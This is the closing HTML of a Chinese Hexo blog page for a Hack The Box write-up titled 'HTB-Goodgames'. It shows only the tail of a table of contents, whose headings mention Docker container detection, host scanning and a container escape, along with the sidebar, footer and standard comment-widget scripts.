class="toc-text">3. 辅助线索：异常的用户与挂载目录（侧面印证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BD%91%E7%BB%9C%E7%BA%BF%E7%B4%A2%EF%BC%9ADocker%E4%B8%93%E5%B1%9E%E7%9A%84%E7%A7%81%E6%9C%89%E7%BD%91%E6%AE%B5IP%EF%BC%88%E8%A1%A5%E5%85%85%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="toc-number">2.1.4.</span> <span class="toc-text">4. 网络线索：Docker专属的私有网段IP（补充验证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E9%80%BB%E8%BE%91%EF%BC%9A%E5%AE%B9%E5%99%A8%E5%86%85%E2%80%9Croot%E2%80%9D%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7%EF%BC%88%E9%9A%90%E6%80%A7%E4%BD%90%E8%AF%81%EF%BC%89"><span class="toc-number">2.1.5.</span> <span class="toc-text">5. 权限逻辑：容器内“root”的局限性（隐性佐证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E5%88%A4%E6%96%AD%E9%80%BB%E8%BE%91%E9%93%BE"><span class="toc-number">2.1.6.</span> <span class="toc-text">总结：判断逻辑链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%BB%8Emount%E7%BB%93%E6%9E%9C%E5%88%A4%E6%96%ADaugustus%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%BB%8E%E4%B8%BB%E6%9C%BA%E6%8C%82%E8%BD%BD%E7%9A%84%E8%A7%A3%E9%87%8A"><span class="toc-number">2.2.</span> <span class="toc-text">关于从mount结果判断augustus用户是否从主机挂载的解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%AE%9A%E4%BD%8D-home-augustus%E7%9A%84%E6%8C%82%E8%BD%BD%E6%9D%A1%E7%9B%AE"><span class="toc-number">2.2.1.</span> <span class="toc-text">一、第一步：定位&#x2F;home&#x2F;augustus的挂载条目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A4%E6%96%AD%E2%80%9C%E4%BB%8E%E4%B8%BB%E6%9C%BA%E6%8C%82%E8%BD%BD%E2%80%9D%EF%BC%9A%E7%9C%8B%E3%80%8C%E6%8C%82%E8%BD%BD%E6%BA%90-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%E3%80%8D%E4%B8%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%AD%98%E5%82%A8%E7%89%B9%E6%80%A7"><span class="toc-number">2.2.2.</span> <span class="toc-text">二、判断“从主机挂载”：看「挂载源+文件系统类型」与Docker容器的存储特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%88%E6%98%8E%E7%A1%AE%EF%BC%9A%E5%AE%B9%E5%99%A8%E5%86%85%E9%83%A8%E7%9A%84%E2%80%9C%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E2%80%9D%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7%EF%BC%9F"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">1. 先明确：容器内部的“虚拟文件系统”长什么样？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%86%8D%E7%9C%8B-home-augustus%E7%9A%84%E6%8C%82%E8%BD%BD%E6%BA%90%EF%BC%9A-dev-sda1%E6%98%AF%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%AE%9E%E4%BD%93%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">2. 再看&#x2F;home&#x2F;augustus的挂载源：&#x2F;dev&#x2F;sda1是宿主机的实体硬盘分区</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A4%E6%96%AD%E2%80%9C%E5%85%B7%E5%A4%87%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90%E2%80%9D%EF%BC%9A%E7%9C%8B%E3%80%8C%E6%8C%82%E8%BD%BD%E9%80%89%E9%A1%B9%E4%B8%AD%E7%9A%84rw%E6%A0%87%E8%AF%86%E3%80%8D"><span class="toc-number">2.2.3.</span> <span class="toc-text">三、判断“具备读写权限”：看「挂载选项中的rw标识」</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E5%88%A4%E6%96%AD%E9%80%BB%E8%BE%91%E9%93%BE-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">总结：判断逻辑链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E4%BB%A5%E5%8F%8A%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%89%AB%E6%8F%8F-bash"><span class="toc-number">2.3.</span> <span class="toc-text">内部存活主机以及端口的扫描 - bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E7%9A%84%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">2.4.</span> <span class="toc-text">Docker逃逸的具体操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AC%A0%E7%BC%BA%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">5.</span> <span class="toc-text">欠缺的知识</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/03/Goodgames/" title="HTB-Goodgames">HTB-Goodgames</a><time datetime="2025-09-03T09:52:38.000Z" title="发表于 2025-09-03 17:52:38">2025-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/01/OSCP+%E5%AD%A6%E4%B9%A0%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" title="OSCP+学习经验分享">OSCP+学习经验分享</a><time datetime="2025-09-01T07:48:44.000Z" title="发表于 2025-09-01 15:48:44">2025-09-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #000000;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Mszr</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+
+  const disqusReset = conf => {
+    window.DISQUS && window.DISQUS.reset({
+      reload: true,
+      config: conf
+    })
+  }
+
+  const loadDisqus = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyDisqus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    window.disqus_identifier = isShuoshuo ? path : '/2025/09/03/Goodgames/'
+    window.disqus_url = isShuoshuo ? location.origin + path : 'http://111yl111.github.io/2025/09/03/Goodgames/'
+
+    const disqus_config = function () {
+      this.page.url = disqus_url
+      this.page.identifier = disqus_identifier
+      this.page.title = 'HTB-Goodgames'
+    }
+
+    if (window.DISQUS) disqusReset(disqus_config)
+    else {
+      const script = document.createElement('script')
+      script.src = 'https://.disqus.com/embed.js'
+      script.setAttribute('data-timestamp', +new Date())
+      document.head.appendChild(script)
+    }
+
+    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
+  }
+
+  const getCount = async() => {
+    try {
+      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
+      if (!eleGroup) return
+      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')
+
+      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
+        method: 'GET'
+      })
+      const result = await res.json()
+
+      const count = result.response.length ? result.response[0].posts : 0
+      eleGroup.textContent = count
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Disqus'
+      ? window.shuoshuoComment = { loadComment: loadDisqus }
+      : window.loadOtherComment = loadDisqus
+    return
+  }
+
+  if ('Valine' === 'Disqus' || !false) {
+    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+    else {
+      loadDisqus()
+      GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()
+    }
+  } else {
+    window.loadOtherComment = loadDisqus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
